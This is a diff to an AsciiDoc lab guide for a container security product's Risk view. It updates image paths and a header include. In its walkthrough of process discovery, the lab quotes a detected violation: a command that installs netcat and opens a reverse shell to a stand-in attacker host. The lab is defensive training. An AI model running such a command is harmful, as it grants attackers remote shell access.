@@ -1,9 +1,5 @@
 :labname: Risk
 
-:includedir:
-
-include::{includedir}../include/00_0_Lab_Header.adoc[]
-
 == {labname} Lab
 
 :numbered:
@@ -49,7 +45,7 @@ Deployments at the top of the list present the most risk.
 .Procedure
 . From the left navigation menu, select the *Risk* tab:
 +
-image::rhacs_risk_view.png[RHACM Risk view]
+image::images/rhacs_risk_view.png[RHACM Risk view]
 
 === View Single Deployment Details
 
@@ -58,7 +54,7 @@ In this section, you examine the riskiest deployment to gain an understanding of
 .Procedure
 . Click the `visa-processor` deployment to bring up the *Risk Details* panel, with the *Risk Indicators* tab selected:
 +
-image:rhacs_risk_details_panel.png[Risk Details panel]
+image:images/rhacs_risk_details_panel.png[Risk Details panel]
 +
 The *Risk Indicators* tab shows why this deployment is considered a high risk.
 The deployment has serious, fixable vulnerabilities, but it also has configurations such as network ports and service exposure outside the cluster, making it more likely to be attacked.
@@ -90,7 +86,7 @@ You could in theory add those processes to the baseline with the `+` sign and si
 . Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation: `-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.
 . Optionally, add tags to help organize your analysis:
 +
-image::rhacs_process_discovery.png[RHACS Process Discovery]
+image::images/rhacs_process_discovery.png[RHACS Process Discovery]
 +
 . In the header bar, click the *View Graph* to call up the *Event Timeline*.
 +
@@ -98,7 +94,7 @@ The event timeline shows for each pod the process activity that has occurred ove
 +
 . Click the squares or circles for process activity:
 +
-image::rhacs_event_timeline.png[RHACS Event Timeline]
+image::images/rhacs_event_timeline.png[RHACS Event Timeline]
 +
 You can take advantage of the constrained lifecycle of containers for better runtime incident detection and response.
 Containers are not general-purpose virtual machines and therefore generally have a simple lifecycle.
@@ -118,7 +114,7 @@ In this section, you take a look at what processes are explicitly allowed to run
 . Click the *Process Discovery* tab on the *Risk Details* panel.
 . Scroll down to the *Spec Container Baselines* section:
 +
-image::rhacs_lock_baselines.png[RHACS Lock Baselines]
+image::images/rhacs_lock_baselines.png[RHACS Lock Baselines]
 +
 The tooltip shows that the `visa-processor` container is already locked, and warns of the consequences of unlocking.
 The list below shows all of the processes discovered and added to the baseline in the first hour of runtime.
